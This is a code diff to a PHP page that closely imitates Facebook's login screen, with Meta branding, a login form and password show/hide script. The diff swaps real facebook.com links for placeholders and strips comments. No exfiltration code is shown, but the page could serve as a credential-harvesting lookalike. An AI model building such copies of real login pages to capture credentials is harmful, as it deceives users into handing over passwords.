@@ -92,7 +92,6 @@ function render_error(string $message)
 							<div id="ll_container">
 								<div id="ll_img">
 									<div>
-										<!-- <img src="images/icons8-facebook-72.svg" alt="facebook logo"> -->
 										<svg viewBox="0 0 24 24">
 											<path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
 										</svg>
@@ -161,7 +160,7 @@ function render_error(string $message)
 																	</div>
 																</div>
 																<div id="forgot">
-																	<a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzg4NDkxMzMxfQ%3D%3D&ars=facebook_login">
+																	<a href="#">
 																		<div class="btn-container">
 																			<span>Forgotten password?</span>
 																		</div>
@@ -169,7 +168,7 @@ function render_error(string $message)
 																</div>
 																<div id="create">
 																	<div class="create-container">
-																		<a href="https://www.facebook.com/reg/?entry_point=login">
+																		<a href="#">
 																			<div class="btn-container">
 																				Create new account
 																			</div>
@@ -177,7 +176,6 @@ function render_error(string $message)
 																	</div>
 																</div>
 																<div id="meta">
-																	<!-- <img src="images/meta-brand-color.svg" alt="Meta Icon"> -->
 																	<svg aria-label="Meta logo" class="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
 																		<defs>
 																			<linearGradient gradientUnits="userSpaceOnUse" id="_R_l6kqsqppb6amH1_" x1="124.38" x2="160.839" y1="99" y2="59.326">
@@ -228,43 +226,43 @@ function render_error(string $message)
 										<div class="links">
 											<div id="lang_links">
 												<div><a href="login.php">English (UK)</a></div>
-												<div><a href="">ಕನ್ನಡ</a></div>
-												<div><a href="">اردو</a></div>
-												<div><a href="">मराठी</a></div>
-												<div><a href="">తెలుగు</a></div>
-												<div><a href="">हिन्दी</a></div>
-												<div><a href="">தமிழ்</a></div>
-												<div><a href="">More languages…</a></div>
+												<div><a href="#">ಕನ್ನಡ</a></div>
+												<div><a href="#">اردو</a></div>
+												<div><a href="#">मराठी</a></div>
+												<div><a href="#">తెలుగు</a></div>
+												<div><a href="#">हिन्दी</a></div>
+												<div><a href="#">தமிழ்</a></div>
+												<div><a href="#">More languages…</a></div>
 											</div>
 										</div>
 										<div class="links">
 											<div id="other_links_container">
 												<div id="other_links">
-													<div><a href="">Sign up</a></div>
-													<div><a href="login.html">Log in</a></div>
+													<div><a href="#">Sign up</a></div>
+													<div><a href="login.php">Log in</a></div>
 													<div><a href="https://www.messenger.com/">Messenger</a></div>
 													<div><a href="https://www.facebook.com/lite/">Facebook Lite</a></div>
 													<div><a href="https://www.facebook.com/watch/">Video</a></div>
-													<div><a href="">Meta Pay</a></div>
-													<div><a href="">Meta Store</a></div>
-													<div><a href="">Meta Quest</a></div>
-													<div><a href="">Ray-Ban Meta</a></div>
-													<div><a href="">Meta AI</a></div>
-													<div><a href="">Muse</a></div>
-													<div><a href=""> Instagram </a></div>
-													<div><a href="" target="_blank">Threads</a></div>
-													<div><a href="" target="_blank">Privacy Policy</a></div>
-													<div><a href="">Privacy Centre</a></div>
-													<div><a href="">About</a></div>
-													<div><a href="">Create ad</a></div>
-													<div><a href="">Create Page</a></div>
-													<div><a href="">Developers</a></div>
-													<div><a href="">Careers</a></div>
-													<div><a href="">Cookies</a></div>
-													<div><a href="">AdChoices</a></div>
-													<div><a href="">Terms</a></div>
-													<div><a href="">Help</a></div>
-													<div><a href="">Contact uploading and non-users</a>
+													<div><a href="#">Meta Pay</a></div>
+													<div><a href="#">Meta Store</a></div>
+													<div><a href="#">Meta Quest</a></div>
+													<div><a href="#">Ray-Ban Meta</a></div>
+													<div><a href="#">Meta AI</a></div>
+													<div><a href="#">Muse</a></div>
+													<div><a href="#"> Instagram </a></div>
+													<div><a href="#">Threads</a></div>
+													<div><a href="#">Privacy Policy</a></div>
+													<div><a href="#">Privacy Centre</a></div>
+													<div><a href="#">About</a></div>
+													<div><a href="#">Create ad</a></div>
+													<div><a href="#">Create Page</a></div>
+													<div><a href="#">Developers</a></div>
+													<div><a href="#">Careers</a></div>
+													<div><a href="#">Cookies</a></div>
+													<div><a href="#">AdChoices</a></div>
+													<div><a href="#">Terms</a></div>
+													<div><a href="#">Help</a></div>
+													<div><a href="#">Contact uploading and non-users</a>
 													</div>
 												</div>
 											</div>
@@ -284,13 +282,6 @@ function render_error(string $message)
 			//login form submission
 			$("#login_button").on('click', function() {
 				$("#login_form").submit();
-				// $("#login_id_box").removeClass("error-container");
-				// $("#password_box").removeClass("error-container");
-				// if($("#id_error").text() != "") {
-				// 	$("#login_id_box").addClass("error-container");
-				// } else if($("#pwd_error").text() != "") {
-				// 	$("#password_box").addClass("error-container");
-				// }
 			})
 
 			//toggle show or hide password icon
@@ -320,7 +311,6 @@ function render_error(string $message)
 			//show or hide password
 			$("#eye-icon").on('click', function() {
 				var inp = $("#pwd");
-				console.log(inp);
 				if (inp[0].type === "password") {
 					inp[0].type = 'text';
 					$("#eye")[0].src = "images/eye/eye-password-show-svgrepo-com.svg"
